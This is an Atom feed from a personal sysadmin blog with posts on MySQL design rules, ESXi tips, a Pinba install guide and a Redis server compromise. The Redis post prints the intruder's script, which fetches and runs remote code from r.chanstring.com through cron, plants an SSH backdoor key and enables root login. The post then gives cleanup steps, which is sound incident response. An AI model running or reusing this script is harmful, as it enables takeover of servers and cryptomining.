<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>t1ger的茶馆</title>
  <subtitle>头顶有光终是幻，足下生云未是仙</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t1ger.github.io/"/>
  <updated>2016-11-11T07:42:52.070Z</updated>
  <id>https://t1ger.github.io/</id>
  
  <author>
    <name>t1ger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>mysql数据库设计规范</title>
    <link href="https://t1ger.github.io/2016/11/11/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/"/>
    <id>https://t1ger.github.io/2016/11/11/mysql数据库设计规范/</id>
    <published>2016-11-11T03:55:39.000Z</published>
    <updated>2016-11-11T07:42:52.070Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面，此文章为转载，略微整理</p>
<h4 id="一、命名规范"><a href="#一、命名规范" class="headerlink" title="一、命名规范"></a>一、<b>命名规范</b></h4><p>[数据库环境介绍]</p>
<ul>
<li>开发环境(dev)：开发人员可读写，在不影响其他开发同事时可随意修改。</li>
<li>测试环境(qa)：开发和测试可读写，可通过工具修改表结构</li>
<li>模拟环境(sim): 开发可读写，当有上线请求，会在这个环境预执行，这个环境供部署上线演练和压力测试使用</li>
<li>生产数据库从库(stage): 只读环境，不允许修改数据，不允许修改表结构；供线上排查问题，数据查询使用。</li>
<li>生产环境(product): 开发不允许直接进行数据库操作，必须通过DBA进行操作并进行记录</li>
</ul>
<p>不同环境的机器，需要做到权限明确，读写账户分离，能区分具体业务。eg. r_dev,w_dev </p>
<p>[数据库命名规范]</p>
<ul>
<li>简洁明了，体现数据库的用途,建议使用名词</li>
<li>使用英文小写字母、下划线命名，不宜过长(12个字符以内)</li>
<li>默认字符集统一utf-8,如果需要存储emoj表情，需要使用UTF8mb4</li>
</ul>
<p>[表命名规范]</p>
<ul>
<li>具有统一前缀，相关功能表使用相同前缀(前缀名称一般不超过5字)，体现相关业务,建议使用名词</li>
<li>避免用ORACLE、MySQL的保留字，如desc，关键字如index。</li>
<li>使用英文小写字母、下划线命名，不宜过长(12个字符以内)</li>
<li>引擎默认使用innodb,日志或报表酌情使用myisam(mysql8.0已经移除)</li>
<li>必须有主键，建议使用auto_increment的id作为主键（与业务无关）,和业务相关的要做为唯一索引；</li>
<li>所有的表都必须有注释，解释其存放的数据内容</li>
<li>预估数据量，如数据量比较大(char的表&gt;500W行，或int表&gt;1000W)需要考虑分表。分表策略与DBA协商</li>
<li>功能相近的，命名规则应该统一</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `app_store_log` (</div><div class="line">  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &apos;自增ID&apos;,</div><div class="line">  `appid` int(11) NOT NULL COMMENT &apos;应用ID&apos;,</div><div class="line">  `create_time` int(11) NOT NULL COMMENT &apos;建立时间&apos;,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `appid` (`appid`)</div><div class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&apos;应用商店记录表&apos;</div></pre></td></tr></table></figure>
<p>[字段命名规范]</p>
<ul>
<li>数据库字段命名与表命名相似</li>
<li>字段应该有注释，描述字段用途及必要内容的解释</li>
<li>外键统一用xxx-id的方式声明</li>
<li>表主键默认约定为id,自增类型</li>
<li>时间字段，除特殊情况一律采用int记录unix_timestamp</li>
<li>网络IP字段，除特殊情况一律采用bigint来记录inet_aton值</li>
<li>默认字段均为非空，最好指定默认值</li>
<li>有些驱动对tingint支持不够好，通常建议按容量来选择字段</li>
<li>text字段尽量少用，或者拆分到冗余表</li>
<li>对表加新字段，不允许指定字段位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `login_user` (</div><div class="line">  `id` int(10) NOT NULL AUTO_INCREMENT,</div><div class="line">  `jid` int(10) unsigned NOT NULL,</div><div class="line">  `user_id` int(10) NOT NULL COMMENT &apos;用户的id&apos;,</div><div class="line">  `username` varchar(50) NOT NULL COMMENT &apos;用户姓名&apos;,</div><div class="line">  `city` smallint(4) NOT NULL COMMENT &apos;城市&apos;,</div><div class="line">  `ip` bigint(14) NOT NULL COMMENT &apos;登陆ip&apos;,</div><div class="line">  `district_id` tinyint(2) NOT NULL COMMENT &apos;所在区域的id&apos;,</div><div class="line">  `district_name` varchar(20) NOT NULL COMMENT &apos;行政区名字&apos;,</div><div class="line">  `street_id` tinyint(2) NOT NULL COMMENT &apos;所在街道(地标)的id&apos;,</div><div class="line">  `street_name` varchar(20) NOT NULL COMMENT &apos;小区名字&apos;,</div><div class="line">  `status` tinyint(2) NOT NULL DEFAULT &apos;1&apos; COMMENT &apos;用户状态:0禁用 1正常&apos;,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `idx_jid` (`jid`),</div><div class="line">  KEY `user_id_index` (`user_id`)</div><div class="line">) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT=&apos;用户登陆表&apos;</div><div class="line"></div><div class="line"></div><div class="line">ALTER TABLE T_APP_VERSION ADD COLUMN FSECURITY SMALLINT(5) NOT NULL DEFAULT 0 COMMENT &apos;安全扫描结果&apos;;</div></pre></td></tr></table></figure>
<h4 id="二、表设计原则"><a href="#二、表设计原则" class="headerlink" title="二、表设计原则"></a>二、<b>表设计原则</b></h4><p>[职责分离原则]<br>通常指数据的产生和使用，每个系统相互独立，通常取决于以下几点</p>
<ul>
<li>数据的产生：通常谁产生谁负责，维护数据的正个生命周期，产生，修改，销毁等周期。</li>
<li>使用数据者：谁使用谁维护</li>
<li>考虑高内聚，低耦合：在存放数据的时候如果考虑到数据使用原则导致了相关度非常高的数据存放在多个地方，需要多个系统来维护这个数据就有可能导致系统间的耦合性增强，应当尽量避免</li>
</ul>
<p>在设计数据库表间的关系时也要遵循相同原则，职责分离降低耦合，但同时要考虑到性能情况，做到适当冗余而不导致修改逻辑复杂</p>
<p>[在线处理和分析分离]</p>
<ul>
<li>为了保证生产环境数据处理性能，需要将一些分析相关的数据及结果单独库存储，避免在数据分析的时候导致业务数据吞吐量下降，引起系统问题</li>
<li>专门用于存放离线报表数据，并提供线上数据查询方法，建议将统计结果，汇总的数据都从在线处理数据库中移走</li>
</ul>
<p>原则上要将在线用户请求和后台统计请求分开:</p>
<p>a. 将后台统计与生产库分开(一般使用slave)，缺点是数据量大了玩不转。<br>b. 建立离线报表，专门存放统计结果，计算与展示异步处理，缺点是实时业务响应差。<br>c. 实时拉取mysql row binlog，做数据的异构处理(tungsten, canal)，将增量结果处理后(storm)，保存在数据库中，基本实时。</p>
<p>[事物与日志分离]</p>
<p>通常用户生成的内容和用户行为的日志要分开，eg:</p>
<p>游戏DB里存放玩家的基础信息，装备，属性，好友列表等等，这些放到数据库里面。但是玩家的行为日志，比如消耗金币，今天下过哪些副本，买过什么顶级装备，这些属于行为日志，应该单独存放并分析处理。</p>
<p>对于web用记，有好多用户置顶，刷新，竞价，展示等行为，要求实时并且量很大，一定要和贴子分开。</p>
<p>行为日志，需要做分析处理，并且由于时效性不宜存储在mysql中，后期维护就是地雷。</p>
<p>[历史可追溯]</p>
<p>保障数据可追溯，应当遵循一些简单的约定，事后方便数据的查询和统计：</p>
<ul>
<li><p>对于状态数据，应当设计相应状态的字段来保存该数据的最后状态，同时记录下来该数据的初始创建人，时间以及该数据的最后修改人和修改时间；所以在交易数据（如订单合同），广告数据，账户表等都应该默认有状态（status），创建人（creator/creator_name），创建时间（created_at），最后修改人（modifier/modifier_name），最后修改时间（modified_at）等字段用来表明数据的当前状态，创建信息及修改信息。</p>
</li>
<li><p>针对需要跟踪每次修改的数据，需要在数据发生变化的时候记录一张日志表，用于记录该数据发生变化的全生命周期。针对只需要关注关键字段变化的情况，则日志表中只需要记录关键字段变化即可，但操作人，操作类型，时间应当准确记录，日志表数据一旦生成不允许进行修改。如用户账户的充值流水，消费流水都是一些业务紧相关的日志。而审核日志，操作记录等日志则属于与业务关联较小的日志。</p>
</li>
<li><p>针对所有历史需要保留的数据则需要每次变化都生成一个新的版本，比如类目信息等，对原始数据永远只做insert操作，不做delete及update操作。但这种情况仅限于极端数据历史要求极高的情况下使用。</p>
</li>
</ul>
<p>ref </p>
<p><a href="http://verynull.com/2016/06/29/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83" target="_blank" rel="external">Mysql数据库设计规范</a><br><a href="http://www.cnblogs.com/chenpingzhao/p/5059985.html" target="_blank" rel="external">数据库使用的一些规范</a><br><a href="http://www.biaodianfu.com/mysql-best-practices.html" target="_blank" rel="external">MySQL命名、设计及使用规范</a><br><a href="https://github.com/sjqzhang/webtech/blob/master/doc/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83.md" target="_blank" rel="external">数据库设计规范.md</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      mysql database desgin guideline
    
    </summary>
    
    
      <category term="mysql" scheme="https://t1ger.github.io/tags/mysql/"/>
    
      <category term="desgin" scheme="https://t1ger.github.io/tags/desgin/"/>
    
  </entry>
  
  <entry>
    <title>ESXi-5.x FAQ</title>
    <link href="https://t1ger.github.io/2016/11/11/ESXi-5-x-FAQ/"/>
    <id>https://t1ger.github.io/2016/11/11/ESXi-5-x-FAQ/</id>
    <published>2016-11-11T01:43:30.000Z</published>
    <updated>2016-11-11T02:53:05.463Z</updated>
    
    <content type="html"><![CDATA[<p>问题1:远程控制台中键入时出现重复字符<br>解决方法：</p>
<ul>
<li>关闭虚拟机</li>
<li>在虚拟机的配置 (.vmx) 文件结尾添加类似如下的一行：keyboard.typematicMinDelay = “2000000”<br>延迟时间单位指定为微秒，因此以上示例中的行将重复时间增加至 2 秒。</li>
<li>启动此虚拟机<br>如果使用 vSphere Client 进行更改，请执行以下操作：</li>
<li>关闭虚拟机电源</li>
<li>右键单击虚拟机，选择编辑设置</li>
<li>单击选项&gt;常规&gt;配置&gt;配置参数</li>
<li>单击添加行</li>
<li>在“名称”下，输入 keyboard.typematicMinDelay 在值字段中输入 2000000</li>
<li>单击确定</li>
<li>打开虚拟机电源</li>
</ul>
<p>问题2:vmware workstation 迁移至EXSI</p>
<ul>
<li>关闭虚拟机</li>
<li>copy 文件到EXSI服务器</li>
<li>vmkfstools -i “/vmfs/volumes/Datastore/examplevm/examplevm.vmdk” “/vmfs/volumes/Datastore 2/newexamplevm/newexamplevm.vmdk” -d thin -a buslogic </li>
<li>在EXSI服务器上编辑该虚拟机，添加磁盘，使用已经存在的虚拟机，即转换后的那个</li>
<li>启动虚拟机</li>
</ul>
<p>问题3:减小 vCenter Server 数据库的大小</p>
<ul>
<li>确保已经完好备份 vCenter Server Database</li>
<li>关闭 VMware VirtualCenter Server 服务及任何其他使用该数据库的服务</li>
<li>截断 VPX_HIST_STAT1 表及相应的 VPX_SAMPLE_TIME1 表。 截断完成后，验证汇总作业现在是否已成功完成。<br>注意： 在 vCenter Server 5.1 和 5.5 中，表名称为 VPX_HIST_STAT1_n。参考<a href="https://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=2038474" target="_blank" rel="external">Troubleshooting VPX_HIST_STAT table sizes in VMware vCenter Server 5.x</a><br>注意： 要减小 vCenter Server 数据库的大小，还可以删除 VPX_EVENT、VPX_EVENT_ARG 和 VPX_TASK 表中的数据.参考<a href="https://kb.vmware.com/selfservice/search.do?cmd=displayKC&amp;docType=kc&amp;docTypeID=DT_KB_1_1&amp;externalId=1025914" target="_blank" rel="external">Purging old data from the database used by vCenter Server (1025914)</a></li>
<li>要运行汇总脚本，请执行以下步骤：<br>  a.使用 SQL Management Studio 连接到 vCenter Server 的 SQL 数据库。<br>  b.导航到 SQL Server Agent &gt; 作业。<br>  c.选择各个汇总作业，然后右键单击并选择启动作业于步骤。</li>
<li>启动 VMware VirtualCenter Server 服务及任何其他在步骤 2 中停止的服务</li>
</ul>
<p>问题4:dell服务器故障收集</p>
<ul>
<li>开启ssh终端，使用dell Exsi5收集脚本收集。</li>
</ul>
<p>ref</p>
<p><a href="http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=2075522" target="_blank" rel="external">在远程控制台中键入时出现重复字符</a><br><a href="http://blog.csdn.net/zhgn2/article/details/18603529" target="_blank" rel="external">ESXI 5.5的搭建以及VMware9.0的虚拟机移植</a><br><a href="https://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=1028042" target="_blank" rel="external">Cloning and converting virtual machine disks with vmkfstools</a><br><a href="https://kb.vmware.com/selfservice/microsites/search.do?cmd=displayKC&amp;docType=kc&amp;externalId=2077855" target="_blank" rel="external">当汇总脚本需要很长时间才能运行时减小 vCenter Server 数据库的大小</a><br><a href="ftp://64.199.0.197/" target="_blank" rel="external">dell收集工具exsi5_TTY.sh</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      vmware faq
    
    </summary>
    
    
      <category term="vmware" scheme="https://t1ger.github.io/tags/vmware/"/>
    
      <category term="EXSI" scheme="https://t1ger.github.io/tags/EXSI/"/>
    
  </entry>
  
  <entry>
    <title>Recent Redis hacking</title>
    <link href="https://t1ger.github.io/2016/11/04/Recent-Redis-hacking/"/>
    <id>https://t1ger.github.io/2016/11/04/Recent-Redis-hacking/</id>
    <published>2016-11-04T05:18:04.000Z</published>
    <updated>2016-11-04T07:38:35.635Z</updated>
    
    <content type="html"><![CDATA[<p>早上接到cpu负载报警，发现服务器被黑了，又成人家肉鸡了。</p>
<p>登陆系统查看，发下防火墙被关了，crontab被清空重写了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#crontab -l</div><div class="line">*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh</div></pre></td></tr></table></figure>
<p>查看脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</div><div class="line"></div><div class="line">echo &quot;*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh&quot; &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line">echo &quot;*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh&quot; &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line">if [ ! -f &quot;/root/.ssh/KHK75NEOiq&quot; ]; then</div><div class="line">	mkdir -p ~/.ssh</div><div class="line">	rm -f ~/.ssh/authorized_keys*</div><div class="line">	echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root&quot; &gt; ~/.ssh/KHK75NEOiq</div><div class="line">	echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;AuthorizedKeysFile .ssh/KHK75NEOiq&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	/etc/init.d/sshd restart</div><div class="line">fi</div><div class="line"></div><div class="line">if [ ! -f &quot;/etc/init.d/ntp&quot; ]; then</div><div class="line">	if [ ! -f &quot;/etc/systemd/system/ntp.service&quot; ]; then</div><div class="line">		mkdir -p /opt</div><div class="line">		curl -fsSL http://r.chanstring.com/v51/lady_`uname -m` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 -Install</div><div class="line">	fi</div><div class="line">fi</div><div class="line"></div><div class="line">/etc/init.d/ntp start</div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep &quot;/usr/bin/cron&quot;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</div><div class="line">ps auxf|grep -v grep|grep &quot;/opt/cron&quot;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</div></pre></td></tr></table></figure>
<p>分析脚本，我们需要删除相应程序及进程</p>
<ul>
<li>清理crontab 任务</li>
<li>清理.ssh/KHK75NEOiq,恢复/etc/ssh/sshd_config文件或者用其他服务器文件替换，并重启sshd服务。</li>
<li>清理 /etc/init.d/ntp删除并kill掉它启动的进程</li>
<li>清理/usr/local/etc/minerd.conf </li>
</ul>
<p>通过top观察负载，查看是否有minerd进程及ntp进程。</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      hacking redis server
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pinba Server install on centos6.4</title>
    <link href="https://t1ger.github.io/2016/10/31/Pinba-Server-install-on-centos6-4/"/>
    <id>https://t1ger.github.io/2016/10/31/Pinba-Server-install-on-centos6-4/</id>
    <published>2016-10-31T08:35:24.000Z</published>
    <updated>2016-11-02T06:25:15.498Z</updated>
    
    <content type="html"><![CDATA[<p>Pinba is a MySQL storage engine that acts as a realtime monitoring/statistics server for PHP using MySQL as a read-only interface.</p>
<p>Environment:</p>
<p>Pinba 1.1.0<br>Pinboard 1.5.2<br>MySQL: 5.5.50<br>PHP: 5.6</p>
<p>install MySQL:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">yum install cmake  ncurses-devel</div><div class="line">wget http://downloads.mysql.com/archives/get/file/mysql-5.5.50.tar.gz</div><div class="line">tar xvf mysql-5.5.50.tar.gz </div><div class="line">mysql-5.5.50</div><div class="line">cmake .</div><div class="line">make install</div><div class="line">cd /usr/local/mysql</div><div class="line">chown -R mysql.mysql . </div><div class="line">bin/mysql_install_db --user=mysql</div><div class="line">cp support-files/my-medium.cnf /etc/my.cnf</div><div class="line">cp support-files/mysql.server /etc/init.d/mysql.server</div><div class="line">chmod +x /etc/init.d/mysql.server</div><div class="line">chkconfig mysql.server on</div><div class="line">/etc/init.d/mysql.server start</div></pre></td></tr></table></figure>
<p>install Pinba:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">yum install Judy.x86_64 protobuf.x86_64 libevent.x86_64 Judy-devel.x86_64 protobuf-devel.x86_64 libevent-devel.x86_64</div><div class="line">wget http://store.alexlinux.com/sources/P/pinba_engine-1.2.0.tar.gz</div><div class="line">tar zxvf pinba_engine-1.2.0.tar.gz</div><div class="line">./configure --with-mysql=../mysql-5.5.50 --libdir=/usr/local/mysql/lib/plugin</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
<p>install Pinba plugin:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; INSTALL PLUGIN pinba SONAME &apos;libpinba_engine.so&apos;;</div><div class="line">mysql&gt; CREATE DATABASE pinba;</div><div class="line">shell&gt; mysql -D pinba &lt; default_tables.sql</div></pre></td></tr></table></figure>
<p>create mysql user:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; GRANT ALL PRIVILEGES ON pinba.* TO pinba@&quot;&lt;HOST&gt;&quot;</div><div class="line">       IDENTIFIED BY &quot;&lt;PASSWORD&gt;&quot;;</div></pre></td></tr></table></figure>
<p>install Pinba extension,defaut for php7,if you like me use php5 need change it to php5:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">shell&gt; git clone https://github.com/tony2001/pinba_extension.git</div><div class="line">shell&gt; cd pinba_extension</div><div class="line">shell&gt; git checkout -b php5 remotes/origin/php5</div><div class="line">shell&gt; phpize</div><div class="line">shell&gt; ./configure</div><div class="line">shell&gt; make</div><div class="line">shell&gt; make install</div></pre></td></tr></table></figure></p>
<p>install apcu extension:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">shell&gt; wget http://pecl.php.net/get/apcu-4.0.11.tgz</div><div class="line">shell&gt; tar zxvf apcu-4.0.11.tgz</div><div class="line">shell&gt; cd apcu-4.0.11</div><div class="line">shell&gt; phpize</div><div class="line">shell&gt; ./configure --enable-apc-bc</div><div class="line">shell&gt; make</div><div class="line">shell&gt; make install</div></pre></td></tr></table></figure>
<p>install Composer:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl -sS https://getcomposer.org/installer | php</div><div class="line">mv composer.phar /usr/local/bin/composer</div></pre></td></tr></table></figure></p>
<p>install Pinboard:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">shell&gt; tar zxvf v1.5.2.tar.gz</div><div class="line">shell&gt; cd pinboard-1.5.2</div><div class="line">shell&gt; composer install</div><div class="line">shell&gt; ./console migrations:migrate</div><div class="line">shell&gt; ./console register-crontab</div></pre></td></tr></table></figure></p>
<p>confirm server if reecive data on port 30002:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">shell&gt; tcpdump -nn -i any udp port 30002</div></pre></td></tr></table></figure>
<p>nginx configure:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">server &#123;        </div><div class="line">    listen 80;</div><div class="line">    server_name pinboard.me;</div><div class="line">    root /var/www/pinboard/web;</div><div class="line"></div><div class="line">    #site root is redirected to the app boot script</div><div class="line">    location = / &#123;</div><div class="line">        try_files @site @site;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    #all other locations try other files first and go to our front controller if none of them exists</div><div class="line">    location / &#123;</div><div class="line">        try_files $uri $uri/ @site;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    #return 404 for all php files as we do have a front controller</div><div class="line">    location ~ \.php$ &#123;</div><div class="line">        return 404;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location @site &#123;</div><div class="line">        fastcgi_pass unix:/tmp/php-fpm.sock;</div><div class="line">        include fastcgi_params;</div><div class="line">        fastcgi_param SCRIPT_FILENAME $document_root/index.php;</div><div class="line">        fastcgi_param HTTPS $https if_not_empty;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ~ /\.(ht|svn|git) &#123;</div><div class="line">        deny  all;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Now we will see <a href="http://pinboard.me" target="_blank" rel="external">http://pinboard.me</a></p>
<p>install extension for client:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">shell&gt; git clone https://github.com/tony2001/pinba_extension.git</div><div class="line">shell&gt; cd pinba_extension</div><div class="line">shell&gt; git checkout -b php5 remotes/origin/php5</div><div class="line">shell&gt; phpize</div><div class="line">shell&gt; ./configure</div><div class="line">shell&gt; make</div><div class="line">shell&gt; make install</div><div class="line">(</div><div class="line">cat &lt;&lt;EOF</div><div class="line">; Load Pinba extension</div><div class="line">extension=pinba.so</div><div class="line">; Enable and configure Pinba extension</div><div class="line">; See http://pinba.org/wiki/Manual:PHP_extension</div><div class="line">pinba.enabled = 1</div><div class="line">pinba.server = 127.0.0.1</div><div class="line">EOF</div><div class="line">) &gt; /etc/php.d/pinba.ini</div></pre></td></tr></table></figure></p>
<p>ref:</p>
<p><a href="https://github.com/trivoallan/trivoallan.github.com/wiki/HowToPinbaCentOs" target="_blank" rel="external">HowToPinbaCentOs</a><br><a href="https://mrcappuccino.ru/blog/post/pinba-server-installation-on-centos-6" target="_blank" rel="external">install on centos6</a><br><a href="http://www.alexlinux.com/pinba-server-installation-on-centos-7/" target="_blank" rel="external">pinba server installation on CentOS 7</a><br><a href="https://github.com/intaro/pinboard/wiki/Installation" target="_blank" rel="external">pinboard</a><br><a href="https://github.com/tony2001/pinba_engine/wiki" target="_blank" rel="external">pinba</a><br><a href="https://howto.biapy.com/en/debian-gnu-linux/web-applications/monitoring/install-intaro-pinboard-on-debian" target="_blank" rel="external">Install Intaro Pinboard on Debian</a><br><a href="https://recordnotfound.com/pinboard-intaro-25385" target="_blank" rel="external">Intaro Pinboard</a><br><a href="https://github.com/intaro/pinba-bundle" target="_blank" rel="external">PinbaBundle</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Pinba is a MySQL storage engine that acts as a realtime monitoring/statistics server for PHP using MySQL as a read-only interface.&lt;/p&gt;
&lt;p
    
    </summary>
    
    
      <category term="centos" scheme="https://t1ger.github.io/tags/centos/"/>
    
      <category term="Pinba" scheme="https://t1ger.github.io/tags/Pinba/"/>
    
      <category term="mysql5.5" scheme="https://t1ger.github.io/tags/mysql5-5/"/>
    
  </entry>
  
  <entry>
    <title>python属性(property)的理解</title>
    <link href="https://t1ger.github.io/2016/10/26/python%E5%B1%9E%E6%80%A7-property-%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://t1ger.github.io/2016/10/26/python属性-property-的理解/</id>
    <published>2016-10-26T10:18:06.000Z</published>
    <updated>2016-10-26T09:56:04.906Z</updated>
    
